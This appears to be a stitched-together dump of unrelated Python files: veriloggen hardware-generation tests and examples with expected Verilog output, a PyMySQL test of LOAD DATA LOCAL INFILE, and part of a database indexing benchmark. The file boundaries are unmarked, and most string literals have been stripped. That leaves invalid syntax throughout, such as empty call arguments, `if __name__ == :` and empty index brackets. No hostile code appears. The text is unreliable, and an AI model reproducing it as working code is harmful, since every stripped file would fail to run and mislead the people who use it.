0;\n      _tmp_valid_reg_0 <= 0;\n    end else begin\n      if(_tmp_ready_0 || !_tmp_valid_0) begin\n        _tmp_data_reg_0 <= _tmp_odata_0;\n      end \n      if(_tmp_ready_0 || !_tmp_valid_0) begin\n        _tmp_valid_reg_0 <= _tmp_ovalid_0;\n      end \n    end\n  end\n\n\nendmodule\n\n\n\nmodule multiplier_0\n(\n  input CLK,\n  input RST,\n  input update,\n  input enable,\n  output valid,\n  input [32-1:0] a,\n  input [32-1:0] b,\n  output [64-1:0] c\n);\n\n  reg valid_reg0;\n  reg valid_reg1;\n  reg valid_reg2;\n  reg valid_reg3;\n  reg valid_reg4;\n  reg valid_reg5;\n  assign valid = valid_reg5;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      valid_reg0 <= 0;\n      valid_reg1 <= 0;\n      valid_reg2 <= 0;\n      valid_reg3 <= 0;\n      valid_reg4 <= 0;\n      valid_reg5 <= 0;\n    end else begin\n      if(update) begin\n        valid_reg0 <= enable;\n        valid_reg1 <= valid_reg0;\n        valid_reg2 <= valid_reg1;\n        valid_reg3 <= valid_reg2;\n        valid_reg4 <= valid_reg3;\n        valid_reg5 <= valid_reg4;\n      end \n    end\n  end\n\n\n  multiplier_core_0\n  mult\n  (\n    .CLK(CLK),\n    .update(update),\n    .a(a),\n    .b(b),\n    .c(c)\n  );\n\n\nendmodule\n\n\n\nmodule multiplier_core_0\n(\n  input CLK,\n  input update,\n  input [32-1:0] a,\n  input [32-1:0] b,\n  output [64-1:0] c\n);\n\n  reg [32-1:0] _a;\n  reg [32-1:0] _b;\n  reg signed [64-1:0] _tmpval0;\n  reg signed [64-1:0] _tmpval1;\n  reg signed [64-1:0] _tmpval2;\n  reg signed [64-1:0] _tmpval3;\n  reg signed [64-1:0] _tmpval4;\n  wire signed [64-1:0] rslt;\n  assign rslt = $signed({ 1\'d0, _a }) * $signed({ 1\'d0, _b });\n  assign c = _tmpval4;\n\n  always @(posedge CLK) begin\n    if(update) begin\n      _a <= a;\n      _b <= b;\n      _tmpval0 <= rslt;\n      _tmpval1 <= _tmpval0;\n      _tmpval2 <= _tmpval1;\n      _tmpval3 <= _tmpval2;\n      _tmpval4 <= _tmpval3;\n    end \n  end\n\n\nendmodule\n""" \n 
\n 
def test ( ) : \n 
~~~ test_module = dataflow_mul . mkTest ( ) \n 
code = test_module . to_verilog ( ) \n 
\n 
from pyverilog . vparser . parser import VerilogParser \n 
from pyverilog . ast_code_generator . codegen import ASTCodeGenerator \n 
parser = VerilogParser ( ) \n 
expected_ast = parser . parse ( expected_verilog ) \n 
codegen = ASTCodeGenerator ( ) \n 
expected_code = codegen . visit ( expected_ast ) \n 
\n 
assert ( expected_code == code ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os \n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
valid = m . OutputReg ( , initval = 0 ) \n 
count = m . Reg ( , width = 32 , initval = 0 ) \n 
\n 
up = m . Wire ( ) \n 
down = m . Wire ( ) \n 
m . Assign ( up ( 1 ) ) \n 
m . Assign ( down ( 0 ) ) \n 
\n 
fsm = FSM ( m , , clk , rst ) \n 
\n 
for i in range ( 4 ) : \n 
~~~ fsm . goto_next ( ) \n 
\n 
# condition alias \n 
~~ c = count >= 16 \n 
\n 
# assert valid if the condition is satisfied \n 
# then de-assert 3 cycles later with same condition \n 
fsm . add ( valid ( up ) , cond = c , keep = 3 , eager_val = True , lazy_cond = True ) \n 
fsm . add ( valid ( down ) , cond = c , delay = 3 , eager_val = True , lazy_cond = True ) \n 
fsm . goto_next ( cond = c ) \n 
\n 
for i in range ( 8 ) : \n 
~~~ fsm . goto_next ( ) \n 
\n 
# condition alias \n 
~~ c = count >= 32 \n 
\n 
# assert valid 1 cycle later if the condition is satisfied now \n 
# then de-assert 4 cycles later with same condition \n 
for i in range ( 8 ) : \n 
~~~ fsm . add ( valid ( up ) , cond = c , delay = 1 , keep = 3 , eager_val = True , lazy_cond = True ) \n 
fsm . add ( valid ( down ) , cond = c , delay = 4 , eager_val = True , lazy_cond = True ) \n 
fsm . goto_next ( cond = c ) \n 
\n 
~~ fsm . make_always ( reset = [ count . reset ( ) ] , body = [ count ( count + 1 ) ] ) \n 
\n 
return m \n 
\n 
~~ def mkTest ( ) : \n 
~~~ m = Module ( ) \n 
clk = m . Reg ( ) \n 
rst = m . Reg ( ) \n 
valid = m . Wire ( ) \n 
\n 
uut = m . Instance ( mkLed ( ) , , \n 
ports = ( ( , clk ) , ( , rst ) , ( , valid ) ) ) \n 
\n 
simulation . setup_waveform ( m , uut ) \n 
simulation . setup_clock ( m , clk , hperiod = 5 ) \n 
init = simulation . setup_reset ( m , rst , period = 100 ) \n 
\n 
init . add ( \n 
Delay ( 1000 ) , \n 
Systask ( ) , \n 
) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ test = mkTest ( ) \n 
verilog = test . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import pipeline_draw_graph \n 
\n 
expected_verilog = """\nmodule test\n(\n);\n\n  reg CLK;\n  reg RST;\n  reg [32-1:0] x;\n  reg vx;\n  wire rx;\n  reg [32-1:0] y;\n  reg vy;\n  wire ry;\n  wire [32-1:0] z;\n  wire vz;\n  reg rz;\n\n  blinkled\n  uut\n  (\n    .CLK(CLK),\n    .RST(RST),\n    .x(x),\n    .vx(vx),\n    .rx(rx),\n    .y(y),\n    .vy(vy),\n    .ry(ry),\n    .z(z),\n    .vz(vz),\n    .rz(rz)\n  );\n\n  reg reset_done;\n\n  initial begin\n    $dumpfile("uut.vcd");\n    $dumpvars(0, uut);\n  end\n\n\n  initial begin\n    CLK = 0;\n    forever begin\n      #5 CLK = !CLK;\n    end\n  end\n\n  initial begin\n    RST = 0;\n    reset_done = 0;\n    x = 0;\n    y = 0;\n    vx = 0;\n    vy = 0;\n    rz = 0;\n    #100;\n    RST = 1;\n    #100;\n    RST = 0;\n    #1000;\n    reset_done = 1;\n    @(posedge CLK);\n    #1;\n    #10000;\n    $finish;\n  end\n\n  reg [32-1:0] _tmp_0;\n  reg [32-1:0] _tmp_1;\n  reg [32-1:0] _tmp_2;\n  reg [32-1:0] xfsm;\n  localparam xfsm_init = 0;\n  localparam xfsm_1 = 1;\n  localparam xfsm_2 = 2;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      xfsm <= xfsm_init;\n      _tmp_0 <= 0;\n    end else begin\n      case(xfsm)\n        xfsm_init: begin\n          vx <= 0;\n          if(reset_done) begin\n            xfsm <= xfsm_1;\n          end \n        end\n        xfsm_1: begin\n          vx <= 1;\n          if(rx) begin\n            x <= x + 1;\n          end \n          if(rx) begin\n            _tmp_0 <= _tmp_0 + 1;\n          end \n          if((_tmp_0 == 10) && rx) begin\n            xfsm <= xfsm_2;\n          end \n        end\n        xfsm_2: begin\n          vx <= 0;\n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] yfsm;\n  localparam yfsm_init = 0;\n  localparam yfsm_1 = 1;\n  localparam yfsm_2 = 2;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      yfsm <= yfsm_init;\n      _tmp_1 <= 0;\n    end else begin\n      case(yfsm)\n        yfsm_init: begin\n          vy <= 0;\n          if(reset_done) begin\n            yfsm <= yfsm_1;\n          end \n        end\n        yfsm_1: begin\n          vy <= 1;\n          if(ry) begin\n            y <= y + 2;\n          end \n          if(ry) begin\n            _tmp_1 <= _tmp_1 + 1;\n          end \n          if((_tmp_1 == 10) && ry) begin\n            yfsm <= yfsm_2;\n          end \n        end\n        yfsm_2: begin\n          vy <= 0;\n        end\n      endcase\n    end\n  end\n\n  reg [32-1:0] zfsm;\n  localparam zfsm_init = 0;\n  localparam zfsm_1 = 1;\n  localparam zfsm_2 = 2;\n  localparam zfsm_3 = 3;\n  localparam zfsm_4 = 4;\n  localparam zfsm_5 = 5;\n  localparam zfsm_6 = 6;\n  localparam zfsm_7 = 7;\n  localparam zfsm_8 = 8;\n  localparam zfsm_9 = 9;\n  localparam zfsm_10 = 10;\n  localparam zfsm_11 = 11;\n  localparam zfsm_12 = 12;\n  localparam zfsm_13 = 13;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      zfsm <= zfsm_init;\n    end else begin\n      case(zfsm)\n        zfsm_init: begin\n          rz <= 0;\n          if(reset_done) begin\n            zfsm <= zfsm_1;\n          end \n        end\n        zfsm_1: begin\n          zfsm <= zfsm_2;\n        end\n        zfsm_2: begin\n          if(vz) begin\n            rz <= 1;\n          end \n          if(vz) begin\n            zfsm <= zfsm_3;\n          end \n        end\n        zfsm_3: begin\n          rz <= 0;\n          zfsm <= zfsm_4;\n        end\n        zfsm_4: begin\n          rz <= 0;\n          zfsm <= zfsm_5;\n        end\n        zfsm_5: begin\n          rz <= 0;\n          zfsm <= zfsm_6;\n        end\n        zfsm_6: begin\n          rz <= 0;\n          zfsm <= zfsm_7;\n        end\n        zfsm_7: begin\n          rz <= 0;\n          zfsm <= zfsm_8;\n        end\n        zfsm_8: begin\n          rz <= 0;\n          zfsm <= zfsm_9;\n        end\n        zfsm_9: begin\n          rz <= 0;\n          zfsm <= zfsm_10;\n        end\n        zfsm_10: begin\n          rz <= 0;\n          zfsm <= zfsm_11;\n        end\n        zfsm_11: begin\n          rz <= 0;\n          zfsm <= zfsm_12;\n        end\n        zfsm_12: begin\n          rz <= 0;\n          zfsm <= zfsm_13;\n        end\n        zfsm_13: begin\n          zfsm <= zfsm_2;\n        end\n      endcase\n    end\n  end\n\n  always @(posedge CLK) begin\n    if(reset_done) begin\n      if(vx && rx) begin\n        $display("x=%d", x);\n      end \n      if(vy && ry) begin\n        $display("y=%d", y);\n      end \n      if(vz && rz) begin\n        $display("z=%d", z);\n      end \n    end \n  end\n\nendmodule\n\nmodule blinkled\n(\n  input CLK,\n  input RST,\n  input [32-1:0] x,\n  input vx,\n  output rx,\n  input [32-1:0] y,\n  input vy,\n  output ry,\n  output [32-1:0] z,\n  output vz,\n  input rz\n);\n\n  assign rx = (_df_ready_0 || !_df_valid_0) && (vx && vy);\n  assign ry = (_df_ready_0 || !_df_valid_0) && (vx && vy);\n  reg [32-1:0] _df_data_0;\n  reg _df_valid_0;\n  wire _df_ready_0;\n  assign _df_ready_0 = rz;\n  assign z = _df_data_0;\n  assign vz = _df_valid_0;\n\n  always @(posedge CLK) begin\n    if(RST) begin\n      _df_data_0 <= 0;\n      _df_valid_0 <= 0;\n    end else begin\n      if(vx && vy && (rx && ry) && (_df_ready_0 || !_df_valid_0)) begin\n        _df_data_0 <= x + y;\n      end \n      if(_df_valid_0 && _df_ready_0) begin\n        _df_valid_0 <= 0;\n      end \n      if(rx && ry && (_df_ready_0 || !_df_valid_0)) begin\n        _df_valid_0 <= vx && vy;\n      end \n    end\n  end\n\nendmodule\n""" \n 
\n 
def test ( ) : \n 
~~~ test_module = pipeline_draw_graph . mkTest ( ) \n 
code = test_module . to_verilog ( ) \n 
\n 
from pyverilog . vparser . parser import VerilogParser \n 
from pyverilog . ast_code_generator . codegen import ASTCodeGenerator \n 
parser = VerilogParser ( ) \n 
expected_ast = parser . parse ( expected_verilog ) \n 
codegen = ASTCodeGenerator ( ) \n 
expected_code = codegen . visit ( expected_ast ) \n 
\n 
assert ( expected_code == code ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import sys \n 
import os \n 
\n 
# the next line can be removed after installation \n 
sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os . path . dirname ( os \n 
from veriloggen import * \n 
\n 
def mkLed ( ) : \n 
~~~ m = Module ( ) \n 
interval = m . Parameter ( , 16 ) \n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
led = m . OutputReg ( , 8 , initval = 0 ) \n 
count = m . Reg ( , 32 , initval = 0 ) \n 
\n 
seq = Seq ( m , , clk , rst ) \n 
seq . add ( Systask ( , , led , count ) ) \n 
seq . add ( count ( count + 1 ) , cond = count < interval - 1 ) \n 
seq . add ( count ( 0 ) , cond = count == interval - 1 ) \n 
seq . add ( led ( led + 1 ) , cond = count == interval - 1 ) \n 
\n 
seq . make_always ( ) \n 
\n 
return m \n 
\n 
~~ def mkTest ( ) : \n 
~~~ m = Module ( ) \n 
\n 
# target instance \n 
led = mkLed ( ) \n 
\n 
# copy paras and ports \n 
params = m . copy_params ( led ) \n 
ports = m . copy_sim_ports ( led ) \n 
\n 
clk = ports [ ] \n 
rst = ports [ ] \n 
\n 
uut = m . Instance ( led , , \n 
params = m . connect_params ( led ) , \n 
ports = m . connect_ports ( led ) ) \n 
\n 
#simulation.setup_waveform(m, uut) \n 
simulation . setup_clock ( m , clk , hperiod = 5 ) \n 
init = simulation . setup_reset ( m , rst , m . make_reset ( ) , period = 100 ) \n 
\n 
init . add ( \n 
Delay ( 1000 ) , \n 
Systask ( ) , \n 
) \n 
\n 
return m \n 
\n 
~~ if __name__ == : \n 
~~~ test = mkTest ( ) \n 
verilog = test . to_verilog ( ) \n 
print ( verilog ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
import read_verilog_module_str \n 
\n 
expected_verilog = """\nmodule top #\n  (\n   parameter WIDTH = 8\n  )\n  (\n   input CLK, \n   input RST, \n   output [WIDTH-1:0] LED\n  );\n  blinkled #\n  (\n   .WIDTH(WIDTH)\n  )\n  inst_blinkled\n  (\n   .CLK(CLK),\n   .RST(RST),\n   .LED(LED)\n  );\nendmodule\n\nmodule blinkled #\n  (\n   parameter WIDTH = 8\n  )\n  (\n   input CLK, \n   input RST, \n   output reg [WIDTH-1:0] LED\n  );\n  reg [32-1:0] count;\n  always @(posedge CLK) begin\n    if(RST) begin        \n      count <= 0;\n    end else begin\n      if(count == 1023) begin\n        count <= 0;\n      end else begin\n        count <= count + 1;\n      end\n    end \n  end \n  always @(posedge CLK) begin\n    if(RST) begin        \n      LED <= 0;\n    end else begin\n      if(count == 1023) begin        \n        LED <= LED + 1;\n      end  \n    end \n  end \nendmodule\n""" \n 
\n 
def test ( ) : \n 
~~~ test_module = read_verilog_module_str . mkTop ( ) \n 
code = test_module . to_verilog ( ) \n 
\n 
from pyverilog . vparser . parser import VerilogParser \n 
from pyverilog . ast_code_generator . codegen import ASTCodeGenerator \n 
parser = VerilogParser ( ) \n 
expected_ast = parser . parse ( expected_verilog ) \n 
codegen = ASTCodeGenerator ( ) \n 
expected_code = codegen . visit ( expected_ast ) \n 
\n 
assert ( expected_code == code ) \n 
~~ from __future__ import absolute_import \n 
from __future__ import print_function \n 
\n 
import veriloggen . core . vtypes as vtypes \n 
import veriloggen . core . module as module \n 
\n 
def mkMultiplierCore ( index , lwidth = 32 , rwidth = 32 , lsigned = True , rsigned = True , depth = 6 ) : \n 
~~~ retwidth = lwidth + rwidth \n 
\n 
m = module . Module ( % index ) \n 
\n 
clk = m . Input ( ) \n 
update = m . Input ( ) \n 
\n 
a = m . Input ( , lwidth ) \n 
b = m . Input ( , rwidth ) \n 
c = m . Output ( , retwidth ) \n 
\n 
_a = m . Reg ( , lwidth , signed = lsigned ) \n 
_b = m . Reg ( , rwidth , signed = rsigned ) \n 
tmpval = [ m . Reg ( % i , retwidth , signed = True ) for i in range ( depth - 1 ) ] \n 
rslt = m . Wire ( , retwidth , signed = True ) \n 
\n 
__a = _a \n 
__b = _b \n 
if not lsigned : \n 
~~~ __a = vtypes . SystemTask ( , vtypes . Cat ( vtypes . Int ( 0 , width = 1 ) , _a ) ) \n 
~~ if not rsigned : \n 
~~~ __b = vtypes . SystemTask ( , vtypes . Cat ( vtypes . Int ( 0 , width = 1 ) , _b ) ) \n 
\n 
~~ m . Assign ( rslt ( __a * __b ) ) \n 
m . Assign ( c ( tmpval [ depth - 2 ] ) ) \n 
\n 
m . Always ( vtypes . Posedge ( clk ) ) ( \n 
vtypes . If ( update ) ( \n 
_a ( a ) , \n 
_b ( b ) , \n 
tmpval [ 0 ] ( rslt ) , \n 
[ tmpval [ i ] ( tmpval [ i - 1 ] ) for i in range ( 1 , depth - 1 ) ] \n 
) ) \n 
\n 
return m \n 
\n 
~~ def mkMultiplier ( index , lwidth = 32 , rwidth = 32 , lsigned = True , rsigned = True , depth = 6 ) : \n 
~~~ if lwidth < 0 : raise ValueError ( "data width must be greater than 0." ) \n 
if rwidth < 0 : raise ValueError ( "data width must be greater than 0." ) \n 
if depth < 2 : raise ValueError ( "depth must be greater than 2." ) \n 
\n 
retwidth = lwidth + rwidth \n 
\n 
mult = mkMultiplierCore ( index , lwidth , rwidth , lsigned , rsigned , depth ) \n 
\n 
m = module . Module ( % index ) \n 
\n 
clk = m . Input ( ) \n 
rst = m . Input ( ) \n 
\n 
update = m . Input ( ) \n 
enable = m . Input ( ) \n 
valid = m . Output ( ) \n 
\n 
a = m . Input ( , lwidth ) \n 
b = m . Input ( , rwidth ) \n 
c = m . Output ( , retwidth ) \n 
\n 
valid_reg = [ m . Reg ( % i ) for i in range ( depth ) ] \n 
\n 
m . Assign ( valid ( valid_reg [ depth - 1 ] ) ) \n 
\n 
m . Always ( vtypes . Posedge ( clk ) ) ( \n 
vtypes . If ( rst ) ( \n 
[ valid_reg [ i ] ( 0 ) for i in range ( depth ) ] \n 
) . Else ( \n 
vtypes . If ( update ) ( \n 
valid_reg [ 0 ] ( enable ) , \n 
[ valid_reg [ i ] ( valid_reg [ i - 1 ] ) for i in range ( 1 , depth ) ] \n 
) \n 
) ) \n 
\n 
ports = [ ( , clk ) , ( , update ) , ( , a ) , ( , b ) , ( , c ) ] \n 
m . Instance ( mult , , ports = ports ) \n 
\n 
return m \n 
\n 
# global multiplier count \n 
~~ index_count = 0 \n 
def get_mul ( lwidth = 32 , rwidth = 32 , lsigned = True , rsigned = True , depth = 6 ) : \n 
~~~ global index_count \n 
mul = mkMultiplier ( index_count , lwidth , rwidth , lsigned , rsigned , depth ) \n 
index_count += 1 \n 
return mul \n 
\n 
~~ def reset ( ) : \n 
~~~ global index_count \n 
index_count = 0 \n 
~~ from pymysql import OperationalError , Warning \n 
from pymysql . tests import base \n 
\n 
import os \n 
import warnings \n 
\n 
__all__ = [ "TestLoadLocal" ] \n 
\n 
\n 
class TestLoadLocal ( base . PyMySQLTestCase ) : \n 
~~~ def test_no_file ( self ) : \n 
~~~ """Test load local infile when the file does not exist""" \n 
conn = self . connections [ 0 ] \n 
c = conn . cursor ( ) \n 
c . execute ( "CREATE TABLE test_load_local (a INTEGER, b INTEGER)" ) \n 
try : \n 
~~~ self . assertRaises ( \n 
OperationalError , \n 
c . execute , \n 
( "LOAD DATA LOCAL INFILE \'no_data.txt\' INTO TABLE " \n 
"test_load_local fields terminated by \',\'" ) \n 
) \n 
~~ finally : \n 
~~~ c . execute ( "DROP TABLE test_load_local" ) \n 
c . close ( ) \n 
\n 
~~ ~~ def test_load_file ( self ) : \n 
~~~ """Test load local infile with a valid file""" \n 
conn = self . connections [ 0 ] \n 
c = conn . cursor ( ) \n 
c . execute ( "CREATE TABLE test_load_local (a INTEGER, b INTEGER)" ) \n 
filename = os . path . join ( os . path . dirname ( os . path . realpath ( __file__ ) ) , \n 
, \n 
) \n 
try : \n 
~~~ c . execute ( \n 
( "LOAD DATA LOCAL INFILE \'{0}\' INTO TABLE " + \n 
"test_load_local FIELDS TERMINATED BY \',\'" ) . format ( filename ) \n 
) \n 
c . execute ( "SELECT COUNT(*) FROM test_load_local" ) \n 
self . assertEqual ( 22749 , c . fetchone ( ) [ 0 ] ) \n 
~~ finally : \n 
~~~ c . execute ( "DROP TABLE test_load_local" ) \n 
\n 
~~ ~~ def test_load_warnings ( self ) : \n 
~~~ """Test load local infile produces the appropriate warnings""" \n 
conn = self . connections [ 0 ] \n 
c = conn . cursor ( ) \n 
c . execute ( "CREATE TABLE test_load_local (a INTEGER, b INTEGER)" ) \n 
filename = os . path . join ( os . path . dirname ( os . path . realpath ( __file__ ) ) , \n 
, \n 
) \n 
try : \n 
~~~ with warnings . catch_warnings ( record = True ) as w : \n 
~~~ warnings . simplefilter ( ) \n 
c . execute ( \n 
( "LOAD DATA LOCAL INFILE \'{0}\' INTO TABLE " + \n 
"test_load_local FIELDS TERMINATED BY \',\'" ) . format ( filename ) \n 
) \n 
self . assertEqual ( w [ 0 ] . category , Warning ) \n 
self . assertTrue ( "Incorrect integer value" in str ( w [ - 1 ] . message ) ) \n 
~~ ~~ finally : \n 
~~~ c . execute ( "DROP TABLE test_load_local" ) \n 
c . close ( ) \n 
\n 
\n 
~~ ~~ ~~ if __name__ == "__main__" : \n 
~~~ import unittest \n 
unittest . main ( ) \n 
~~ from __future__ import print_function \n 
from time import time \n 
import subprocess \n 
import random \n 
import numpy \n 
\n 
# Constants \n 
\n 
STEP = 1000 * 100 # the size of the buffer to fill the table, in rows \n 
SCALE = 0.1 # standard deviation of the noise compared with actual \n 
# values \n 
NI_NTIMES = 1 # The number of queries for doing a mean (non-idx cols) \n 
\n 
\n 
# READ_TIMES = WARMCACHE+50    # The number of complete calls to DB.query_db() \n 
\n 
\n 
# READ_TIMES = WARMCACHE+50    # The number of complete calls to DB.query_db() \n 
MROW = 1000 * 1000. \n 
\n 
# Test values \n 
COLDCACHE = 5 \n 
WARMCACHE = 5 \n 
READ_TIMES = 10 # The number of complete calls to DB.query_db() \n 
\n 
# global variables \n 
rdm_cod = [ , ] \n 
prec = 6 # precision for printing floats purposes \n 
\n 
\n 
def get_nrows ( nrows_str ) : \n 
~~~ if nrows_str . endswith ( "k" ) : \n 
~~~ return int ( float ( nrows_str [ : - 1 ] ) * 1000 ) \n 
~~ elif nrows_str . endswith ( "m" ) : \n 
~~~ return int ( float ( nrows_str [ : - 1 ] ) * 1000 * 1000 ) \n 
~~ elif nrows_str . endswith ( "g" ) : \n 
~~~ return int ( float ( nrows_str [ : - 1 ] ) * 1000 * 1000 * 1000 ) \n 
~~ else : \n 
~~~ raise ValueError ( \n 
"value of nrows must end with either \'k\', \'m\' or \'g\' suffixes." ) \n 
\n 
\n 
~~ ~~ class DB ( object ) : \n 
\n 
~~~ def __init__ ( self , nrows , rng , userandom ) : \n 
~~~ global step , scale \n 
self . step = STEP \n 
self . scale = SCALE \n 
self . rng = rng \n 
self . userandom = userandom \n 
self . filename = . join ( [ rdm_cod [ userandom ] , nrows ] ) \n 
self . nrows = get_nrows ( nrows ) \n 
\n 
~~ def get_db_size ( self ) : \n 
~~~ sout = subprocess . Popen ( "sync;du -s %s" % self . filename , shell = True , \n 
stdout = subprocess . PIPE ) . stdout \n 
line = [ l for l in sout ] [ 0 ] \n 
return int ( line . split ( ) [ 0 ] ) \n 
\n 
~~ def print_mtime ( self , t1 , explain ) : \n 
~~~ mtime = time ( ) - t1 \n 
print ( "%s:" % explain , round ( mtime , 6 ) ) \n 
print ( "Krows/s:" , round ( ( self . nrows / 1000. ) / mtime , 6 ) ) \n 
\n 
~~ def print_qtime ( self , colname , ltimes ) : \n 
~~~ qtime1 = ltimes [ 0 ] # First measured time \n 
qtime2 = ltimes [ - 1 ] # Last measured time \n 
print ( "Query time for %s:" % colname , round ( qtime1 , 6 ) ) \n 
print ( "Mrows/s:" , round ( ( self . nrows / ( MROW ) ) / qtime1 , 6 ) ) \n 
print ( "Query time for %s (cached):" % colname , round ( qtime2 , 6 ) ) \n 
print ( "Mrows/s (cached):" , round ( ( self . nrows / ( MROW ) ) / qtime2 , 6 ) ) \n 
\n 
~~ def norm_times ( self , ltimes ) : \n 
~~~ "Get the mean and stddev of ltimes, avoiding the extreme values." \n 
lmean = ltimes . mean ( ) \n 
lstd = ltimes . std ( ) \n 
ntimes = ltimes [ ltimes < lmean + lstd ] \n 
nmean = ntimes . mean ( ) \n 
nstd = ntimes . std ( ) \n 
return nmean , nstd \n 
\n 
~~ def print_qtime_idx ( self , colname , ltimes , repeated , verbose ) : \n 
~~~ if repeated : \n 
~~~ r = "[REP] " \n 
~~ else : \n 
~~~ r = "[NOREP] " \n 
~~ ltimes = numpy . array ( ltimes ) \n 
ntimes = len ( ltimes ) \n 
qtime1 = ltimes [ 0 ] # First measured time \n 
ctimes = ltimes [ 1 : COLDCACHE ] \n 
cmean , cstd = self . norm_times ( ctimes ) \n 
wtimes = ltimes [ WARMCACHE : ] \n 
wmean , wstd = self . norm_times ( wtimes ) \n 
if verbose : \n 
~~~ print ( "Times for cold cache:\\n" , ctimes ) \n 
# print "Times for warm cache:\\n", wtimes \n 
print ( "Histogram for warm cache: %s\\n%s" % \n 
numpy . histogram ( wtimes ) ) \n 
~~ print ( "%s1st query time for %s:" % ( r , colname ) , \n 
round ( qtime1 , prec ) ) \n 
print ( "%sQuery time for %s (cold cache):" % ( r , colname ) , \n 
round ( cmean , prec ) , "+-" , round ( cstd , prec ) ) \n 
print ( "%sQuery time for %s (warm cache):" % ( r , colname ) , \n 
round ( wmean , prec ) , "+-" , round ( wstd , prec ) ) \n 
\n 
~~ def print_db_sizes ( self , init , filled , indexed ) : \n 
~~~ table_size = ( filled - init ) / 1024. \n 
indexes_size = ( indexed - filled ) / 1024. \n 
print ( "Table size (MB):" , round ( table_size , 3 ) ) \n 
print ( "Indexes size (MB):" , round ( indexes_size , 3 ) ) \n 
print ( "Full size (MB):" , round ( table_size + indexes_size , 3 ) ) \n 
\n 
~~ def fill_arrays ( self , start , stop ) : \n 
~~~ arr_f8 = numpy . arange ( start , stop , dtype = ) \n 
arr_i4 = numpy . arange ( start , stop , dtype = ) \n 
if self . userandom : \n 
~~~ arr_f8 += numpy . random . normal ( 0 , stop * self . scale , \n 
size = stop - start ) \n 
arr_i4 = numpy . array ( arr_f8 , dtype = ) \n 
~~ return arr_i4 , arr_f8 \n 
\n 
~~ def create_db ( self , dtype , kind , optlevel , verbose ) : \n 
~~~ self . con = self . open_db ( remove = 1 ) \n 
self . create_table ( self . con ) \n 
init_size = self . get_db_size ( ) \n 
t1 = time ( ) \n 
self . fill_table ( self . con ) \n 
table_size = self . get_db_size ( ) \n 
self . print_mtime ( t1 , ) \n 
self . index_db ( dtype , kind , optlevel , verbose ) \n 
indexes_size = self . get_db_size ( ) \n 
self . print_db_sizes ( init_size , table_size , indexes_size ) \n 
self . close_db ( self . con ) \n 
\n 
~~ def index_db ( self , dtype , kind , optlevel , verbose ) : \n 
~~~ if dtype == "int" : \n 
~~~ idx_cols = [ ] \n 
~~ elif dtype == "float" : \n 
~~~ idx_cols = [ ] \n 
~~ else : \n 
~~~ idx_cols = [ , ] \n 
~~ for colname in idx_cols : \n 
~~~ t1 = time ( ) \n 
self . index_col ( self . con , colname , kind , optlevel , verbose ) \n 
self . print_mtime ( t1 , % colname ) \n 
\n 
~~ ~~ def query_db ( self , niter , dtype , onlyidxquery , onlynonidxquery , \n 
avoidfscache , verbose , inkernel ) : \n 
~~~ self . con = self . open_db ( ) \n 
if dtype == "int" : \n 
~~~ reg_cols = [ ] \n 
idx_cols = [ ] \n 
~~ elif dtype == "float" : \n 
~~~ reg_cols = [ ] \n 
idx_cols = [ ] \n 
~~ else : \n 
~~~ reg_cols = [ , ] \n 
idx_cols = [ , ] \n 
~~ if avoidfscache : \n 
~~~ rseed = int ( numpy . random . randint ( self . nrows ) ) \n 
~~ else : \n 
~~~ rseed = 19 \n 
# Query for non-indexed columns \n 
~~ numpy . random . seed ( rseed ) \n 
base = numpy . random . randint ( self . nrows ) \n 
if not onlyidxquery : \n 
~~~ for colname in reg_cols : \n 
~~~ ltimes = [ ] \n 
random . seed ( rseed ) \n 
for i in range ( NI_NTIMES ) : \n 
~~~ t1 = time ( ) \n 
results = self . do_query ( self . con , colname , base , inkernel ) \n 
ltimes . append ( time ( ) - t1 ) \n 
~~ if verbose : \n 
~~~ print ( "Results len:" , results ) \n 
~~ self . print_qtime ( colname , ltimes ) \n 
# Always reopen the file after *every* query loop. \n 
# Necessary to make the benchmark to run correctly. \n 
~~ self . close_db ( self . con ) \n 
self . con = self . open_db ( ) \n 
# Query for indexed columns \n 
~~ if not onlynonidxquery : \n 
~~~ for colname in idx_cols : \n 
~~~ ltimes = [ ] \n 
numpy . random . seed ( rseed ) \n 
rndbase = numpy . random . randint ( self . nrows , size = niter ) \n 
# First, non-repeated queries \n 
for i in range ( niter ) : \n 
~~~ base = rndbase [ i ] \n 
t1 = time ( ) \n 
results = self . do_query ( self . con , colname , base , inkernel ) \n 
#results, tprof = self.do_query( \n 
#    self.con, colname, base, inkernel) \n 
ltimes . append ( time ( ) - t1 ) \n 
~~ if verbose : \n 
~~~ print ( "Results len:" , results ) \n 
~~ self . print_qtime_idx ( colname , ltimes , False , verbose ) \n 
# Always reopen the file after *every* query loop. \n 
# Necessary to make the benchmark to run correctly. \n 
self . close_db ( self . con ) \n 
self . con = self . open_db ( ) \n 
ltimes = [ ] \n 
# Second, repeated queries \n 
#                 for i in range(niter): \n 
#                     t1=time() \n 
#                     results = self.do_query( \n 
#                         self.con, colname, base, inkernel) \n 
# results, tprof = self.do_query(self.con, colname, base, inkernel) \n 
#                     ltimes.append(time()-t1) \n 
#                 if verbose: \n 
#                     print "Results len:", results \n 
#                 self.print_qtime_idx(colname, ltimes, True, verbose) \n 
# Print internal PyTables index tprof statistics \n 
#tprof = numpy.array(tprof) \n 
#tmean, tstd = self.norm_times(tprof) \n 
# print "tprof-->", round(tmean, prec), "+-", round(tstd, prec) \n 
# print "tprof hist-->", \\ \n 
#    numpy.histogram(tprof) \n 
# print "tprof raw-->", tprof \n 
# Always reopen the file after *every* query loop. \n 
